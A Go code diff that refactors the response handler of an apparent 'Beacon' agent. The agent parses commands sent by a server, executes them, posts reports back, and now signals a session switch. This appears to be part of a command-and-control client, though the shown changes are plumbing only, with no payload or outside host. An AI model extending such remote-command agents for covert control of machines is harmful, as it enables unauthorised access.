@@ -9,28 +9,28 @@ import (
 
 // HandleResponse is the entry point for processing a server's response.
 // It is typically called in a new goroutine from the main Beacon loop.
-func HandleResponse(responseBody string) {
+func HandleResponse(responseBody string) bool {
 	logger.Log("Handling server response.")
 
 	// 1. Parse the initial server response.
 	serverResponse, err := parseServerResponse(responseBody)
 	if err != nil {
 		logger.Error("Critical error parsing server response: " + err.Error())
-		return
+		return false
 	}
 
 	if len(serverResponse.Commands) == 0 {
 		logger.Log("No commands received in response.")
-		return
+		return false
 	}
 
-	// 2. Process the list of commands and generate reports.
-	reports := processCommands(serverResponse.Commands)
+	reports, switchSession := processCommands(serverResponse.Commands)
 
 	// 3. Post the generated reports back to the server.
 	if err := postReportsToServer(reports); err != nil {
 		logger.Error("Failed to post reports to server: " + err.Error())
 	}
+	return switchSession
 }
 
 // parseServerResponse unmarshals the raw JSON string from the server.
@@ -45,13 +45,17 @@ func parseServerResponse(responseBody string) (httpFuncs.ServerResponseWithComma
 
 // processCommands iterates through a list of commands, executes them,
 // and returns a list of reports.
-func processCommands(commands []httpFuncs.CommandData) []httpFuncs.CommandReport {
+func processCommands(commands []httpFuncs.CommandData) ([]httpFuncs.CommandReport, bool) {
 	var reports []httpFuncs.CommandReport
+	var switchSession bool
 	for _, command := range commands {
-		report := executeCommand(command)
+		report, session := executeCommand(command)
 		reports = append(reports, report)
 		// Handle any special side-effects after execution.
 		handleSessionSideEffect(command)
+		if session {
+			switchSession = true
+		}
 	}
-	return reports
+	return reports, switchSession
 }
